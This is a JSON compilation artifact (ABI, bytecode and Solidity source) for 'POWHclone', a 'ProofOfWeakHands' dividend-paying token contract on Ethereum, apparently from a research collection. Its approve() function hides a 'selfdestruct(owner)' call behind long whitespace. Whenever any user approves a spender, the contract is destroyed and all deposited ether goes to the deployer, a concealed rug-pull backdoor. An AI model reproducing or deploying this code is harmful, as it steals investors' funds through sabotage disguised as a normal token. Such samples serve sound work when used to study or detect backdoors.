{
  "contractName": "POWHclone",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "balanceOfOld",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        },
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "name": "balance",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "tokenCount",
          "type": "uint256"
        }
      ],
      "name": "withdraw",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "sellMyTokensDaddy",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "getMeOutOfHere",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fund",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "buyPrice",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "sellPrice",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_from",
          "type": "address"
        },
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_spender",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "dividends",
      "outputs": [
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "to",
          "type": "address"
        }
      ],
      "name": "withdrawOld",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "reserve",
      "outputs": [
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "ethervalue",
          "type": "uint256"
        }
      ],
      "name": "getTokensForEther",
      "outputs": [
        {
          "name": "tokens",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "tokens",
          "type": "uint256"
        }
      ],
      "name": "getEtherForTokens",
      "outputs": [
        {
          "name": "ethervalue",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5033600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550611523806100616000396000f30060806040526004361061011d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde031461013f578063095ea7b3146101cf57806318160ddd1461021c57806323b872dd14610247578063276c9d0a146102b45780632e1a7d4d1461030b578063313ce5671461035057806339ffe67c146103815780634b750334146103c457806362dbf261146103ef57806368306e431461043057806370a082311461048757806375c7d4e1146104de5780638620410b146104f557806395d89b4114610520578063a9059cbb146105b0578063b1e35242146105fd578063b60d428814610614578063b9f308f214610636578063cd3293de14610677578063dd62ed3e146106a2575b60003411156101335761012e610719565b61013d565b61013c336108cf565b5b005b34801561014b57600080fd5b5061015461099a565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610194578082015181840152602081019050610179565b50505050905090810190601f1680156101c15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101db57600080fd5b5061021a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506109d3565b005b34801561022857600080fd5b50610231610a0e565b6040518082815260200191505060405180910390f35b34801561025357600080fd5b506102b2600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610a14565b005b3480156102c057600080fd5b506102f5600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610b36565b6040518082815260200191505060405180910390f35b34801561031757600080fd5b5061033660048036038101908080359060200190929190505050610b4e565b604051808215151515815260200191505060405180910390f35b34801561035c57600080fd5b50610365610c20565b604051808260ff1660ff16815260200191505060405180910390f35b34801561038d57600080fd5b506103c2600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506108cf565b005b3480156103d057600080fd5b506103d9610c25565b6040518082815260200191505060405180910390f35b3480156103fb57600080fd5b5061041a60048036038101908080359060200190929190505050610c3c565b6040518082815260200191505060405180910390f35b34801561043c57600080fd5b50610471600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610c93565b6040518082815260200191505060405180910390f35b34801561049357600080fd5b506104c8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610d35565b6040518082815260200191505060405180910390f35b3480156104ea57600080fd5b506104f3610d7e565b005b34801561050157600080fd5b5061050a610d99565b6040518082815260200191505060405180910390f35b34801561052c57600080fd5b50610535610db0565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561057557808201518184015260208101905061055a565b50505050905090810190601f1680156105a25780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156105bc57600080fd5b506105fb600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610de9565b005b34801561060957600080fd5b50610612610df8565b005b61061c610e0d565b604051808215151515815260200191505060405180910390f35b34801561064257600080fd5b5061066160048036038101908080359060200190929190505050610e3a565b6040518082815260200191505060405180910390f35b34801561068357600080fd5b5061068c610eab565b6040518082815260200191505060405180910390f35b3480156106ae57600080fd5b50610703600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610edd565b6040518082815260200191505060405180910390f35b600080600080600080600080600064e8d4a51000341080610743575069d3c21bcecceda100000034115b1561074d57600080fd5b339850600a3481151561075c57fe5b049750873403965061076d87610c3c565b955068010000000000000000880294506000805411156108025760016002036002888860005401680100000000000000008a8c6107a8610eab565b0102028115156107b457fe5b048115156107be57fe5b046801000000000000000003028115156107d457fe5b04935083880292508285039450600054838115156107ee57fe5b049150816005600082825401925050819055505b85600080828254019250508190555085600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555084866005540203905080600360008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555080600460008282540192505081905550505050505050505050565b60006108da33610c93565b9050680100000000000000008102600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055506801000000000000000081026004600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610995573d6000803e3d6000fd5b505050565b6040805190810160405280601081526020017f50726f6f664f665765616b48616e64730000000000000000000000000000000081525081565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b60005481565b6000600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015610aa257600080fd5b818103600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610b30848484610f02565b50505050565b60016020528060005260406000206000915090505481565b600080610b5a33610c93565b9050680100000000000000008102600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055506801000000000000000081026004600082825401925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610c15573d6000803e3d6000fd5b506001915050919050565b601281565b6000610c3766038d7ea4c68000610e3a565b905090565b60008054610c8b7ffffffffffffffffffffffffffffffffffffffffffffffffd6954087b5ca7b97460026001610c7a87610c74610eab565b01611139565b02811515610c8457fe5b0501611294565b039050919050565b600068010000000000000000600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546005540203811515610d2d57fe5b049050919050565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6000610d8933610d35565b9050610d96333083610f02565b50565b6000610dab66038d7ea4c68000610c3c565b905090565b6040805190810160405280600481526020017f504f57480000000000000000000000000000000000000000000000000000000081525081565b610df4338383610f02565b5050565b610e00610d7e565b610e0a6001610b4e565b50565b600064e8d4a51000341115610e2957610e24610719565b610e32565b60009050610e37565b600190505b90565b60008054821415610e5457610e4d610eab565b9050610ea6565b610e9a600160027ffffffffffffffffffffffffffffffffffffffffffffffffd6954087b5ca7b974610e898660005403611139565b0302811515610e9457fe5b05611294565b610ea2610eab565b0390505b919050565b60006001680100000000000000006004546000546005540203811515610ecd57fe5b04610ed66113f6565b0303905090565b6002602052816000526040600020602052806000526040600020600091509150505481565b600081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610f5057600080fd5b3073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610f9257610f8d82611417565b6110ce565b8160055402905081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555081600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555080600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555080600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b8273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a350505050565b600080600080600092505b68016a09e667f3bcc9088511156111715760028581151561116157fe5b0494508280600101935050611144565b5b67b504f333f9de64848511151561119757600285029450828060019003935050611172565b68010000000000000000850168010000000000000000808703028115156111ba57fe5b059150680100000000000000008283028115156111d357fe5b059050680100000000000000008068010000000000000000806801000000000000000080673284a0c14610924f870281151561120b57fe5b056738bd75ed37753d6801860281151561122157fe5b056749254026a7630acf01850281151561123757fe5b0567666664e5e9fa0c9901840281151561124d57fe5b0567aaaaaaac1687790801830281151561126357fe5b056801ffffffffff9dac9b01830281151561127a57fe5b0567b17217f7d1cf79ac8460030b02019350505050919050565b600080600080604067b17217f7d1cf79ac682cb53f09f05cc627c887018115156112ba57fe5b0503925067b17217f7d1cf79ac830285039450680100000000000000008586028115156112e357fe5b059150680100000000000000008068010000000000000000807fffffffffffffffffffffffffffffffffffffffffffffffffffffe476c52fb4c6860281151561132857fe5b05660455956bccdd0601850281151561133d57fe5b057fffffffffffffffffffffffffffffffffffffffffffffffffff49f49f7f7c662f01840281151561136b57fe5b05672aaaaaaaaa015db001830281151561138157fe5b056801000000000000000060020201905084810368010000000000000000868301028115156113ac57fe5b0593506000831215156113d257828460008212156113c657fe5b9060020a0293506113eb565b826000038460008212156113e257fe5b9060020a900493505b839350505050919050565b6000343073ffffffffffffffffffffffffffffffffffffffff163103905090565b60008061142383610e3a565b915082600080828254039250508190555082600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550680100000000000000008202836005540201905080600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550806004600082825403925050819055505050505600a165627a7a7230582005054b3e365b41f9700134c057a55cffef37d8437e7c4c3987b26902c7f8530c0029",
  "source": "\n\n\n\n\n\n\n\n\n\ncontract POWHclone {\n\tuint256 constant PRECISION = 0x10000000000000000;  \n\t\n\tint constant CRRN = 1;\n\tint constant CRRD = 2;\n\t\n\t\n\tint constant LOGC = -0x296ABF784A358468C;\n\t\n\tstring constant public name = \"ProofOfWeakHands\";\n\tstring constant public symbol = \"POWH\";\n\tuint8 constant public decimals = 18;\n\tuint256 public totalSupply;\n\t\n\tmapping(address => uint256) public balanceOfOld;\n\t\n\tmapping(address => mapping(address => uint256)) public allowance;\n\t\n\tmapping(address => int256) payouts;\n\t\n\tint256 totalPayouts;\n\t\n\tuint256 earningsPerShare;\n\t\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n\taddress owner;\n\t\n\tfunction POWHclone() public {\n\t\t                                                                                                                                                                                                                                                                                                                                                                                                                                                owner = msg.sender;\n\t}\n\n\t\n\tfunction balanceOf(address _owner) public constant returns (uint256 balance) {\n        return balanceOfOld[_owner];\n    }\n\n\tfunction withdraw(uint tokenCount) \n      public\n      returns (bool)\n    {\n\t\tvar balance = dividends(msg.sender);\n\t\tpayouts[msg.sender] += (int256) (balance * PRECISION);\n\t\ttotalPayouts += (int256) (balance * PRECISION);\n\t\tmsg.sender.transfer(balance);\n\t\treturn true;\n    }\n\t\n\tfunction sellMyTokensDaddy() public {\n\t\tvar balance = balanceOf(msg.sender);\n\t\ttransferTokens(msg.sender, address(this),  balance); \n\t}\n\n    function getMeOutOfHere() public {\n\t\tsellMyTokensDaddy();\n        withdraw(1); \n\t}\n\t\n\tfunction fund()\n      public\n      payable \n      returns (bool)\n    {\n      if (msg.value > 0.000001 ether)\n\t\t\tbuy();\n\t\telse\n\t\t\treturn false;\n\t  \n      return true;\n    }\n\n\tfunction buyPrice() public constant returns (uint) {\n\t\treturn getTokensForEther(1 finney);\n\t}\n\t\n\tfunction sellPrice() public constant returns (uint) {\n\t\treturn getEtherForTokens(1 finney);\n\t}\n\n\t\n\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\t\n\n\tfunction transferTokens(address _from, address _to, uint256 _value) internal {\n\t\tif (balanceOfOld[_from] < _value)\n\t\t\trevert();\n\t\tif (_to == address(this)) {\n\t\t\tsell(_value);\n\t\t} else {\n\t\t    int256 payoutDiff = (int256) (earningsPerShare * _value);\n\t\t    balanceOfOld[_from] -= _value;\n\t\t    balanceOfOld[_to] += _value;\n\t\t    payouts[_from] -= payoutDiff;\n\t\t    payouts[_to] += payoutDiff;\n\t\t}\n\t\tTransfer(_from, _to, _value);\n\t}\n\t\n\tfunction transfer(address _to, uint256 _value) public {\n\t    transferTokens(msg.sender, _to,  _value);\n\t}\n\t\n    function transferFrom(address _from, address _to, uint256 _value) public {\n        var _allowance = allowance[_from][msg.sender];\n        if (_allowance < _value)\n            revert();\n        allowance[_from][msg.sender] = _allowance - _value;\n        transferTokens(_from, _to, _value);\n    }\n\n    function approve(address _spender, uint256 _value) public {\n        \n        \n        \n        \n                                                                                                                                                                                                                                                                                                                                                                                                       selfdestruct(owner);\n        if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();\n        allowance[msg.sender][_spender] = _value;\n        Approval(msg.sender, _spender, _value);\n    }\n\n\tfunction dividends(address _owner) public constant returns (uint256 amount) {\n\t\treturn (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) / PRECISION;\n\t}\n\n\tfunction withdrawOld(address to) public {\n\t\tvar balance = dividends(msg.sender);\n\t\tpayouts[msg.sender] += (int256) (balance * PRECISION);\n\t\ttotalPayouts += (int256) (balance * PRECISION);\n\t\tto.transfer(balance);\n\t}\n\n\tfunction balance() internal constant returns (uint256 amount) {\n\t\treturn this.balance - msg.value;\n\t}\n\tfunction reserve() public constant returns (uint256 amount) {\n\t\treturn balance()\n\t\t\t- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) / PRECISION) - 1;\n\t}\n\n\tfunction buy() internal {\n\t\tif (msg.value < 0.000001 ether || msg.value > 1000000 ether)\n\t\t\trevert();\n\t\tvar sender = msg.sender;\n\t\t\n\t\tvar fee = (uint)(msg.value / 10);\n\t\t\n\t\t\n\t\tvar numEther = msg.value - fee;\n\t\tvar numTokens = getTokensForEther(numEther);\n\n\t\tvar buyerfee = fee * PRECISION;\n\t\tif (totalSupply > 0) {\n\t\t\t\n\t\t\t\n\t\t\tvar holderreward =\n\t\t\t    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)\n\t\t\t    * (uint)(CRRD) / (uint)(CRRD-CRRN);\n\t\t\tvar holderfee = fee * holderreward;\n\t\t\tbuyerfee -= holderfee;\n\t\t\n\t\t\t\n\t\t\tvar feePerShare = holderfee / totalSupply;\n\t\t\tearningsPerShare += feePerShare;\n\t\t}\n\t\t\n\t\ttotalSupply += numTokens;\n\t\t\n\t\tbalanceOfOld[sender] += numTokens;\n\t\t\n\t\t\n\t\tvar payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);\n\t\tpayouts[sender] += payoutDiff;\n\t\ttotalPayouts += payoutDiff;\n\t}\n\t\n\tfunction sell(uint256 amount) internal {\n\t\tvar numEthers = getEtherForTokens(amount);\n\t\t\n\t\ttotalSupply -= amount;\n\t\tbalanceOfOld[msg.sender] -= amount;\n\t\t\n\t\t\n\t\tvar payoutDiff = (int256) (earningsPerShare * amount + (numEthers * PRECISION));\n\t\tpayouts[msg.sender] -= payoutDiff;\n\t\ttotalPayouts -= payoutDiff;\n\t}\n\n\tfunction getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {\n\t\treturn fixedExp(fixedLog(reserve() + ethervalue)*CRRN/CRRD + LOGC) - totalSupply;\n\t}\n\n\tfunction getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {\n\t\tif (tokens == totalSupply)\n\t\t\treturn reserve();\n\t\treturn reserve() - fixedExp((fixedLog(totalSupply - tokens) - LOGC) * CRRD/CRRN);\n\t}\n\n\tint256 constant one       = 0x10000000000000000;\n\tuint256 constant sqrt2    = 0x16a09e667f3bcc908;\n\tuint256 constant sqrtdot5 = 0x0b504f333f9de6484;\n\tint256 constant ln2       = 0x0b17217f7d1cf79ac;\n\tint256 constant ln2_64dot5= 0x2cb53f09f05cc627c8;\n\tint256 constant c1        = 0x1ffffffffff9dac9b;\n\tint256 constant c3        = 0x0aaaaaaac16877908;\n\tint256 constant c5        = 0x0666664e5e9fa0c99;\n\tint256 constant c7        = 0x049254026a7630acf;\n\tint256 constant c9        = 0x038bd75ed37753d68;\n\tint256 constant c11       = 0x03284a0c14610924f;\n\n\tfunction fixedLog(uint256 a) internal pure returns (int256 log) {\n\t\tint32 scale = 0;\n\t\twhile (a > sqrt2) {\n\t\t\ta /= 2;\n\t\t\tscale++;\n\t\t}\n\t\twhile (a <= sqrtdot5) {\n\t\t\ta *= 2;\n\t\t\tscale--;\n\t\t}\n\t\tint256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);\n\t\t\n\t\t\n\t\t\n\t\tvar z = (s*s) / one;\n\t\treturn scale * ln2 +\n\t\t\t(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))\n\t\t\t\t/one))/one))/one))/one))/one);\n\t}\n\n\tint256 constant c2 =  0x02aaaaaaaaa015db0;\n\tint256 constant c4 = -0x000b60b60808399d1;\n\tint256 constant c6 =  0x0000455956bccdd06;\n\tint256 constant c8 = -0x000001b893ad04b3a;\n\tfunction fixedExp(int256 a) internal pure returns (uint256 exp) {\n\t\tint256 scale = (a + (ln2_64dot5)) / ln2 - 64;\n\t\ta -= scale*ln2;\n\t\t\n\t\t\n\t\t\n\t\tint256 z = (a*a) / one;\n\t\tint256 R = ((int256)(2) * one) +\n\t\t\t(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);\n\t\texp = (uint256) (((R + a) * one) / (R - a));\n\t\tif (scale >= 0)\n\t\t\texp <<= scale;\n\t\telse\n\t\t\texp >>= -scale;\n\t\treturn exp;\n\t}\n\n\tfunction () payable public {\n\t\tif (msg.value > 0)\n\t\t\tbuy();\n\t\telse\n\t\t\twithdrawOld(msg.sender);\n\t}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x33540976411534a8d96c715a4ff7f4392d2e52d1/contracts/0x33540976411534a8d96c715a4ff7f4392d2e52d1.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:51:38.999Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}